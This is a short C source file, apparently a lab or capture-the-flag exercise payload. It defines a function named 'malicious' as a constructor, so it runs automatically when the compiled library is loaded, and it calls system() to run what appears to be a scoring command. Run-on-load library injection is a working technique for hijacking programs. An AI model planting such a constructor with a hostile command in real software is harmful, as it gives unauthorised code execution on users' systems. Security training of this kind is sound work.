#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 5ea126ec-f815-4d7f-a74a-417ba41568ae");
}

